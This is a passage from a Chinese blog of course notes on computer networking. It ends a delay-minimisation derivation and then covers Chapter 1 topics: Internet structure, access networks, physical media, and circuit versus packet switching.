style="height:0.872331em;"><span style="top:-2.6550000000000002em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.05764em;">S</span></span></span></span><span style="top:-3.23em;"><span class="pstrut" style="height:3em;"></span><span class="frac-line" style="border-bottom-width:0.04em;"></span></span><span style="top:-3.394em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.13889em;">F</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.345em;"><span></span></span></span></span></span><span class="mclose nulldelimiter"></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1.217331em;vertical-align:-0.345em;"></span><span class="mord">2</span><span class="mclose">)</span><span class="mord"><span class="mopen nulldelimiter"></span><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.872331em;"><span style="top:-2.6550000000000002em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.00773em;">R</span></span></span></span><span style="top:-3.23em;"><span class="pstrut" style="height:3em;"></span><span class="frac-line" style="border-bottom-width:0.04em;"></span></span><span style="top:-3.394em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">8</span><span class="mord mtight">0</span><span class="mbin mtight">+</span><span class="mord mathnormal mtight" style="margin-right:0.05764em;">S</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.345em;"><span></span></span></span></span></span><span class="mclose nulldelimiter"></span></span></span></span></span>。要想让这个值最小，可以通过修改分组大小S的值来获取。对该式求导：<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo stretchy="false">(</mo><mfrac><mrow><mn>80</mn><mi>F</mi></mrow><mrow><mi>S</mi><mi>R</mi></mrow></mfrac><mo>+</mo><mfrac><mi>F</mi><mi>R</mi></mfrac><mo>+</mo><mfrac><mrow><mn>160</mn><mo>+</mo><mn>2</mn><mi>S</mi></mrow><mi>R</mi></mfrac><msup><mo stretchy="false">)</mo><mo mathvariant="normal" lspace="0em" rspace="0em">′</mo></msup><mo>=</mo><mfrac><mn>2</mn><mi>R</mi></mfrac><mo>−</mo><mfrac><mrow><mn>80</mn><mi>F</mi></mrow><mrow><msup><mi>S</mi><mn>2</mn></msup><mi>R</mi></mrow></mfrac><mo>=</mo><mn>0</mn></mrow><annotation encoding="application/x-tex">(\frac{80F}{SR}+\frac{F}{R}+\frac{160+2S}{R})&#x27;=\frac{2}{R}-\frac{80F}{S^2R}=0</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.217331em;vertical-align:-0.345em;"></span><span class="mopen">(</span><span class="mord"><span class="mopen nulldelimiter"></span><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.872331em;"><span style="top:-2.6550000000000002em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.05764em;">S</span><span class="mord mathnormal mtight" style="margin-right:0.00773em;">R</span></span></span></span><span style="top:-3.23em;"><span class="pstrut" style="height:3em;"></span><span class="frac-line" style="border-bottom-width:0.04em;"></span></span><span style="top:-3.394em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">8</span><span class="mord mtight">0</span><span class="mord mathnormal mtight" style="margin-right:0.13889em;">F</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.345em;"><span></span></span></span></span></span><span class="mclose nulldelimiter"></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1.217331em;vertical-align:-0.345em;"></span><span class="mord"><span class="mopen nulldelimiter"></span><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.872331em;"><span style="top:-2.6550000000000002em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.00773em;">R</span></span></span></span><span style="top:-3.23em;"><span class="pstrut" style="height:3em;"></span><span class="frac-line" style="border-bottom-width:0.04em;"></span></span><span style="top:-3.394em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.13889em;">F</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.345em;"><span></span></span></span></span></span><span class="mclose nulldelimiter"></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1.217331em;vertical-align:-0.345em;"></span><span class="mord"><span class="mopen nulldelimiter"></span><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.872331em;"><span style="top:-2.6550000000000002em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.00773em;">R</span></span></span></span><span style="top:-3.23em;"><span class="pstrut" style="height:3em;"></span><span class="frac-line" style="border-bottom-width:0.04em;"></span></span><span style="top:-3.394em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">1</span><span class="mord mtight">6</span><span class="mord mtight">0</span><span class="mbin mtight">+</span><span class="mord mtight">2</span><span class="mord mathnormal mtight" style="margin-right:0.05764em;">S</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.345em;"><span></span></span></span></span></span><span class="mclose nulldelimiter"></span></span><span class="mclose"><span class="mclose">)</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.751892em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">′</span></span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1.190108em;vertical-align:-0.345em;"></span><span class="mord"><span class="mopen nulldelimiter"></span><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.845108em;"><span style="top:-2.6550000000000002em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.00773em;">R</span></span></span></span><span style="top:-3.23em;"><span class="pstrut" style="height:3em;"></span><span class="frac-line" style="border-bottom-width:0.04em;"></span></span><span style="top:-3.394em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">2</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.345em;"><span></span></span></span></span></span><span class="mclose nulldelimiter"></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1.217331em;vertical-align:-0.345em;"></span><span class="mord"><span class="mopen nulldelimiter"></span><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.872331em;"><span style="top:-2.6550000000000002em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.05764em;">S</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.7463142857142857em;"><span style="top:-2.786em;margin-right:0.07142857142857144em;"><span class="pstrut" style="height:2.5em;"></span><span class="sizing reset-size3 size1 mtight"><span class="mord mtight">2</span></span></span></span></span></span></span></span><span class="mord mathnormal mtight" style="margin-right:0.00773em;">R</span></span></span></span><span style="top:-3.23em;"><span class="pstrut" style="height:3em;"></span><span class="frac-line" style="border-bottom-width:0.04em;"></span></span><span style="top:-3.394em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">8</span><span class="mord mtight">0</span><span class="mord mathnormal mtight" style="margin-right:0.13889em;">F</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.345em;"><span></span></span></span></span></span><span class="mclose nulldelimiter"></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.64444em;vertical-align:0em;"></span><span class="mord">0</span></span></span></span>，解得<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>S</mi><mo>=</mo><msqrt><mrow><mn>40</mn><mi>F</mi></mrow></msqrt></mrow><annotation encoding="application/x-tex">S=\sqrt{40F}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord mathnormal" style="margin-right:0.05764em;">S</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1.04em;vertical-align:-0.11333499999999996em;"></span><span class="mord sqrt"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.9266650000000001em;"><span class="svg-align" style="top:-3em;"><span class="pstrut" style="height:3em;"></span><span class="mord" style="padding-left:0.833em;"><span class="mord">4</span><span class="mord">0</span><span class="mord mathnormal" style="margin-right:0.13889em;">F</span></span></span><span style="top:-2.886665em;"><span class="pstrut" style="height:3em;"></span><span class="hide-tail" style="min-width:0.853em;height:1.08em;"><svg width='400em' height='1.08em' viewBox='0 0 400000 1080' preserveAspectRatio='xMinYMin slice'><path d='M95,702
c-2.7,0,-7.17,-2.7,-13.5,-8c-5.8,-5.3,-9.5,-10,-9.5,-14
c0,-2,0.3,-3.3,1,-4c1.3,-2.7,23.83,-20.7,67.5,-54
c44.2,-33.3,65.8,-50.3,66.5,-51c1.3,-1.3,3,-2,5,-2c4.7,0,8.7,3.3,12,10
s173,378,173,378c0.7,0,35.3,-71,104,-213c68.7,-142,137.5,-285,206.5,-429
c69,-144,104.5,-217.7,106.5,-221
l0 -0
c5.3,-9.3,12,-14,20,-14
H400000v40H845.2724
s-225.272,467,-225.272,467s-235,486,-235,486c-2.7,4.7,-9,7,-19,7
c-6,0,-10,-1,-12,-3s-194,-422,-194,-422s-65,47,-65,47z
M834 80h400000v40h-400000z'/></svg></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.11333499999999996em;"><span></span></span></span></span></span></span></span></span>，此时的时延值最小，为<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo stretchy="false">(</mo><msqrt><mfrac><mi>F</mi><mn>40</mn></mfrac></msqrt><mo>+</mo><mn>2</mn><mo stretchy="false">)</mo><mfrac><mrow><mn>80</mn><mo>+</mo><msqrt><mrow><mn>40</mn><mi>F</mi></mrow></msqrt></mrow><mi>R</mi></mfrac></mrow><annotation encoding="application/x-tex">(\sqrt{\frac{F}{40}}+2)\frac{80+\sqrt{40F}}{R}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.84em;vertical-align:-0.5913344999999999em;"></span><span class="mopen">(</span><span class="mord sqrt"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.2486655000000002em;"><span class="svg-align" style="top:-3.8em;"><span class="pstrut" style="height:3.8em;"></span><span class="mord" style="padding-left:1em;"><span class="mord"><span class="mopen nulldelimiter"></span><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.872331em;"><span style="top:-2.6550000000000002em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">4</span><span class="mord mtight">0</span></span></span></span><span style="top:-3.23em;"><span class="pstrut" style="height:3em;"></span><span class="frac-line" style="border-bottom-width:0.04em;"></span></span><span style="top:-3.394em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.13889em;">F</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.345em;"><span></span></span></span></span></span><span class="mclose nulldelimiter"></span></span></span></span><span style="top:-3.2086655em;"><span class="pstrut" style="height:3.8em;"></span><span class="hide-tail" style="min-width:1.02em;height:1.8800000000000001em;"><svg width='400em' height='1.8800000000000001em' viewBox='0 0 400000 1944' preserveAspectRatio='xMinYMin slice'><path d='M983 90
l0 -0
c4,-6.7,10,-10,18,-10 H400000v40
H1013.1s-83.4,268,-264.1,840c-180.7,572,-277,876.3,-289,913c-4.7,4.7,-12.7,7,-24,7
s-12,0,-12,0c-1.3,-3.3,-3.7,-11.7,-7,-25c-35.3,-125.3,-106.7,-373.3,-214,-744
c-10,12,-21,25,-33,39s-32,39,-32,39c-6,-5.3,-15,-14,-27,-26s25,-30,25,-30
c26.7,-32.7,52,-63,76,-91s52,-60,52,-60s208,722,208,722
c56,-175.3,126.3,-397.3,211,-666c84.7,-268.7,153.8,-488.2,207.5,-658.5
c53.7,-170.3,84.5,-266.8,92.5,-289.5z
M1001 80h400000v40h-400000z'/></svg></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.5913344999999999em;"><span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1.391603em;vertical-align:-0.345em;"></span><span class="mord">2</span><span class="mclose">)</span><span class="mord"><span class="mopen nulldelimiter"></span><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.046603em;"><span style="top:-2.6550000000000002em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.00773em;">R</span></span></span></span><span style="top:-3.23em;"><span class="pstrut" style="height:3em;"></span><span class="frac-line" style="border-bottom-width:0.04em;"></span></span><span style="top:-3.394em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">8</span><span class="mord mtight">0</span><span class="mbin mtight">+</span><span class="mord sqrt mtight"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.9322900000000001em;"><span class="svg-align" style="top:-3em;"><span class="pstrut" style="height:3em;"></span><span class="mord mtight" style="padding-left:0.833em;"><span class="mord mtight">4</span><span class="mord mtight">0</span><span class="mord mathnormal mtight" style="margin-right:0.13889em;">F</span></span></span><span style="top:-2.89229em;"><span class="pstrut" style="height:3em;"></span><span class="hide-tail mtight" style="min-width:0.853em;height:1.08em;"><svg width='400em' height='1.08em' viewBox='0 0 400000 1080' preserveAspectRatio='xMinYMin slice'><path d='M95,702
c-2.7,0,-7.17,-2.7,-13.5,-8c-5.8,-5.3,-9.5,-10,-9.5,-14
c0,-2,0.3,-3.3,1,-4c1.3,-2.7,23.83,-20.7,67.5,-54
c44.2,-33.3,65.8,-50.3,66.5,-51c1.3,-1.3,3,-2,5,-2c4.7,0,8.7,3.3,12,10
s173,378,173,378c0.7,0,35.3,-71,104,-213c68.7,-142,137.5,-285,206.5,-429
c69,-144,104.5,-217.7,106.5,-221
l0 -0
c5.3,-9.3,12,-14,20,-14
H400000v40H845.2724
s-225.272,467,-225.272,467s-235,486,-235,486c-2.7,4.7,-9,7,-19,7
c-6,0,-10,-1,-12,-3s-194,-422,-194,-422s-65,47,-65,47z
M834 80h400000v40h-400000z'/></svg></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.10770999999999997em;"><span></span></span></span></span></span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.345em;"><span></span></span></span></span></span><span class="mclose nulldelimiter"></span></span></span></span></span>。</li>
<li>略</li>
</ol>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="http://hornos3.github.com/2023/03/02/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E2%80%94%E2%80%94%E7%AC%AC1%E7%AB%A0/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="CoLin">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="CoLin's BLOG">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2023/03/02/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E2%80%94%E2%80%94%E7%AC%AC1%E7%AB%A0/" class="post-title-link" itemprop="url">计算机网络——第1章</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>
              

              <time title="创建时间：2023-03-02 23:26:53 / 修改时间：23:28:18" itemprop="dateCreated datePublished" datetime="2023-03-02T23:26:53+08:00">2023-03-02</time>
            </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">分类于</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/%E8%AF%BE%E5%86%85%E7%AC%94%E8%AE%B0/" itemprop="url" rel="index"><span itemprop="name">课内笔记</span></a>
                </span>
                  ，
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/%E8%AF%BE%E5%86%85%E7%AC%94%E8%AE%B0/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/" itemprop="url" rel="index"><span itemprop="name">计算机网络</span></a>
                </span>
            </span>

          <br>
            <span class="post-meta-item" title="本文字数">
              <span class="post-meta-item-icon">
                <i class="far fa-file-word"></i>
              </span>
                <span class="post-meta-item-text">本文字数：</span>
              <span>5.8k</span>
            </span>
            <span class="post-meta-item" title="阅读时长">
              <span class="post-meta-item-icon">
                <i class="far fa-clock"></i>
              </span>
                <span class="post-meta-item-text">阅读时长 &asymp;</span>
              <span>5 分钟</span>
            </span>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h1 id="chapter-1-计算机网络和因特网"><a class="markdownIt-Anchor" href="#chapter-1-计算机网络和因特网"></a> Chapter 1 计算机网络和因特网</h1>
<h2 id="11-什么是因特网"><a class="markdownIt-Anchor" href="#11-什么是因特网"></a> 1.1 什么是因特网</h2>
<h3 id="111-具体构成描述"><a class="markdownIt-Anchor" href="#111-具体构成描述"></a> 1.1.1 具体构成描述</h3>
<p>因特网由连接在其上的数十亿计的互联计算机设备组成。</p>
<ul>
<li>主机是端系统，运行网络应用程序。</li>
<li>通信链路将这些端系统连接起来，包括光纤、无线电等，它的带宽表现传输速率。</li>
<li>分组交换机用于转发数据分组，包括链路层交换机和路由器。</li>
</ul>
<p>端系统通过因特网服务提供商ISP接入Internet，不同的ISP之间也可以相互连接构成更大的网络。在因特网上运行的网络应用程序属于软件，其上定义有各种协议用于控制报文的发送和接收。这些协议由因特网工程部（IETF）制定，其标准文档称为请求评论（RFC）</p>
<h3 id="112-服务描述"><a class="markdownIt-Anchor" href="#112-服务描述"></a> 1.1.2 服务描述</h3>
<ul>
<li>因特网为应用程序提供服务的基础设施。</li>
<li>因特网为应用程序提供编程接口，应用程序连接到因特网上的通道（套接字接口），且因特网能够提供不同级别的服务选项，对应不同的服务方式和服务质量。</li>
</ul>
<h3 id="113-什么是协议"><a class="markdownIt-Anchor" href="#113-什么是协议"></a> 1.1.3 什么是协议</h3>
<p>一个协议定义了在两个或者多个通信实体之间交换的报文格式和次序，以及报文发送和/或接收一条报文或其他时间所采取的动作。</p>
<h2 id="12-网络边缘"><a class="markdownIt-Anchor" href="#12-网络边缘"></a> 1.2 网络边缘</h2>
<ul>
<li>网络边缘包括：主机（客户端和服务器，可以运行应用程序）、数据中心的服务器</li>
<li>网络核心包括：路由器、网络的网络</li>
<li>接入网和物理媒体：通信链路</li>
</ul>
<p>网络应用的通信模型有：</p>
<ul>
<li>客户/服务器模型（C/S模式）</li>
<li>对等模型（P2P模式），所有主机同时承担服务器和客户机的双重身份</li>
</ul>
<p>连接端系统和边缘路由器的方法：</p>
<ul>
<li>通过住宅接入网（Modem拨号/ADSL拨号/HFC/FTTH/卫星）</li>
<li>通过机构接入网（以太网/Wifi）</li>
<li>通过移动接入网（3G/LTE/5G）</li>
</ul>
<h3 id="121-接入网"><a class="markdownIt-Anchor" href="#121-接入网"></a> 1.2.1 接入网</h3>
<p>接入网是指将端系统连接到边缘路由器的网络。其作用是：将网络边缘与网络核心连接起来，通常是将端系统连接到边缘路由器上。边缘路由器指端系统到任何其他远程端系统的路径上的第一台路由器。</p>
<h4 id="modem-拨号"><a class="markdownIt-Anchor" href="#modem-拨号"></a> Modem 拨号</h4>
<ul>
<li>通过本地电话回路点对点连接ISP的拨号池（通常为路由器）</li>
<li>其速度最高可达56kbps</li>
<li>无法实现在上网的同时打电话</li>
</ul>
<h4 id="dsl-数字用户线"><a class="markdownIt-Anchor" href="#dsl-数字用户线"></a> DSL: 数字用户线</h4>
<ul>
<li>下行/上行速率最高可达55Mbps/15Mbps（运营商可以以不同价格限制用户的上网速率）</li>
<li>采用频分复用的方式：0kHz~4kHz传输语音，4kHz~50kHz为上行，50kHz~1Mhz为下行。</li>
<li>带宽独享（一条线只能给一个用户用）</li>
</ul>
<h4 id="hfc-光纤同轴电缆混合网络"><a class="markdownIt-Anchor" href="#hfc-光纤同轴电缆混合网络"></a> HFC: 光纤同轴电缆混合网络</h4>
<ul>
<li>上行/下行速率最高可达40Mbps/30Mbps</li>
<li>通过有线电视网络部署</li>
<li>带宽共享（一条线可以给多个用户用，分频段使用）</li>
</ul>
<h4 id="局域网接入"><a class="markdownIt-Anchor" href="#局域网接入"></a> 局域网接入</h4>
<ul>
<li>公司或大学的局域网（LAN）将端系统连接到边缘路由器</li>
<li>以太网：通过共享或专用的链路来连接端系统和路由器，速度各有差异，从10Mbps到10Gbps</li>
</ul>
<h4 id="无线接入"><a class="markdownIt-Anchor" href="#无线接入"></a> 无线接入</h4>
<ul>
<li>共享的无线接入网络连接端系统和路由器</li>
<li>无限局域网：基于IEEE 802.11技术，最高1Gbps/s</li>
<li>广域无线接入由电信运营商提供，基于IEEE 802.16</li>
</ul>
<h3 id="122-物理媒体"><a class="markdownIt-Anchor" href="#122-物理媒体"></a> 1.2.2 物理媒体</h3>
<p>常用的物理媒体根据各自的构造和特征、使用的环境、优劣点可以分为几种。</p>
<ul>
<li>导引性媒体：沿着固体媒体被导引的媒体，电波随着固体媒体前行。如光缆（在玻璃光纤传播光脉冲，每一个脉冲一比特，传输速率高且误码率低，不受电磁干扰）、双绞铜线（3类线10Mbps，5类线100Mbps，6类线1Gbps）或同轴电缆（双向传输，可分为基带和宽带）。</li>
<li>非导引型媒体：信号自由传播，如无线局域网（通过电磁频谱传播信号，没有物理线路，可双向传输，但受到传播环境影响较大）或数字卫星频道。地面微波可达45Mbps，无线局域网可达2/11/54Mbps，卫星网络可达45Mbps，有270ms的端到端延时</li>
</ul>
<h2 id="13-网络核心"><a class="markdownIt-Anchor" href="#13-网络核心"></a> 1.3 网络核心</h2>
<p>数据传输的方式有电路交换和分组交换。</p>
<h3 id="131-电路交换"><a class="markdownIt-Anchor" href="#131-电路交换"></a> 1.3.1 电路交换</h3>
<p>电路交换网络是第一代计算机网络<br />
数据交换过程：建立连接，交换数据，释放连接<br />
特性：</p>
<ul>
<li>电路交换网络中一个电路对应一条连接，一个链路对应多条电路</li>
<li>数据交换前需要建立一条从发端到收端的电路（预留资源）</li>
<li>在数据交换的全部时间内用户始终占用端到端固定传输信道</li>
<li>交换双方可以实时进行数据交换而不会产生延迟</li>
</ul>
<p>一条物理链路容纳多条连接的方法：</p>
<ul>
<li>时分复用（TDM）将时间分组，一组分为多个时间片，一个时间片内的所有频率都供一个用户使用，多个用户轮流使用。</li>
<li>频分复用（FDM）将频率分组，同一时刻使用不同频率传输不同用户的数据</li>
</ul>
<p>电路交换的缺点：</p>
<ul>
<li>计算机之间数据交换具有突发性和间歇性特征，电路交换是按照用户占用线路的时间计费的，这可能会造成大量时间的浪费。</li>
<li>不够灵活，只要双方通信建立的通路中出现任何一点故障就需要拨号重新建立连接，不利于紧急通信。</li>
</ul>
<h3 id="132-分组交换"><a class="markdownIt-Anchor" href="#132-分组交换"></a> 1.3.2 分组交换</h3>
<p>分组交换网络是第二代计算机网络。<br />
分组交换网络由</p>
<ul>
<li>路由器构建路由器网络</li>
<li>数据被截断划分为分组</li>
<li>由分组交换机转发分组</li>
<li>使用链路最大传输速率传输（<font color=red>从宏观上而言，链路是共享的，从微观上看，分组传输时是独占链路的。这一点在理解全双工通信时很重要，即每一段链路上同时只能传输一个分组。</font>）</li>
</ul>
<p>分组交换需要解决的问题：</p>
<ul>
<li>为什么分组，如何分组</li>
<li>分组交换机如何确定，是否固定不变</li>
<li>分组如何按照既定路线前行</li>
<li>分组转发模式的具体设计</li>
<li>分组转换方式的效率</li>
<li>可靠性是否能够保障</li>
</ul>
<h4 id="分组的优势"><a class="markdownIt-Anchor" href="#分组的优势"></a> 分组的优势</h4>
<ul>
<li>提高传输效率。假设一共有3段链路，将数据分为几个分组，可以让3段链路同时发送数据，但电路交换也能实现。</li>
<li>提高传输质量。如果在传输过程中出现错误，分组交换只需要重传错误的分组即可，而电路交换需要重传整个报文。</li>
<li>链路利用率高</li>
</ul>
<h4 id="如何分组"><a class="markdownIt-Anchor" href="#如何分组"></a> 如何分组</h4>
<ul>
<li>在发送端，先把较长的报文划分为较短的、固定长度的数据段</li>
<li>将每一个数据段前面添加首部构成分组</li>
<li>分组交换网络以分组作为数据传输单元，依次将各个分组发送到接收端</li>
<li>接收端收到分组后去除首部还原报文</li>
<li>最后接收端将数据重组恢复为原来的报文</li>
</ul>
<h4 id="分组传输的模式"><a class="markdownIt-Anchor" href="#分组传输的模式"></a> 分组传输的模式</h4>
<p>存储转发传输：分组交换机将整个分组接收并存储，然后再发送。这是为了校验分组是否传输正确。</p>
<h4 id="分组交换网络的特征"><a class="markdownIt-Anchor" href="#分组交换网络的特征"></a> 分组交换网络的特征</h4>
<ul>
<li>数据分为若干分组分别传送</li>
<li>不必预先确定分组传输路径，而是由中间的各个交换机和路由器自行确定传输路径</li>
<li>交换结点均为共享结点，选择路径</li>
<li>存储/转发，提高容错率</li>
<li>断续（动态）分配传输带宽，可以最大限度地利用网络带宽资源，不仅降低费用还提高效率</li>
<li>网状拓扑结构可提高可靠性，一条线路产生故障时可以使用其他线路进行传输</li>
<li>主干网络往往由一些高速链路构成，提升网络整体的传输速度</li>
</ul>
<h4 id="存储转发效率"><a class="markdownIt-Anchor" href="#存储转发效率"></a> 存储转发效率</h4>
<p><font color=red>传输时延：L/R。L：分组长度（bit），R：连接设备链路的速率（bps）</font>。N条链路的传输时延为NL/R。注意：传输时延不能理解为一个bit在链路中传输消耗的时间所导致的时延。因为链路中的传输都是光速，造成时延是因为链路的速率有上限，即这条链路一段时间内只能发送多少个bit，这个bit在链路中占有一定的“长度”，可以理解为机器发送bit的速率。如一条链路的速率为10Mbps，即1秒可以传输10000000个bit，1秒光传输的距离为300000km，那么一个bit就占了300000*1000/10000000=30m。n条链路的意思是数据从起点到终点之间经过了多个交换机，这些交换机将链路分为多段，由于交换机需要接收存储一整个分组之后才转发，因此多条链路的传输时延等于每一条链路的传输时延之和。<br />
<font color=red>排队时延</font>：存储需要缓存，当交换机一段时间内接收到的数据较多而无法全部及时转发时，就可能导致排队。<br />
<font color=red>分组丢失（丢包）</font>：当缓存满时，交换机会采用某种算法选择一些数据包丢弃，这些包需要重传。</p>
<h4 id="分组转发的路径"><a class="markdownIt-Anchor" href="#分组转发的路径"></a> 分组转发的路径</h4>
<p>分组首部含有目的地址，路由器根据其转发表选择对应的链路进行转发。转发表通过路由选择协议形成，通过traceroute/tracert命令可以查看路由。</p>
<h4 id="分组交换和电路交换的比较"><a class="markdownIt-Anchor" href="#分组交换和电路交换的比较"></a> 分组交换和电路交换的比较</h4>
<p>分组交换网络的问题</p>
<ul>
<li>分组在各个结点存储转发时因为需要排队总会造成一定的时延，当通信量较大时时延可能会很大</li>
<li>每个分组必须携带头部信息，带来额外开销</li>
<li>整个分组交换网络的管理和控制较为复杂</li>
</ul>
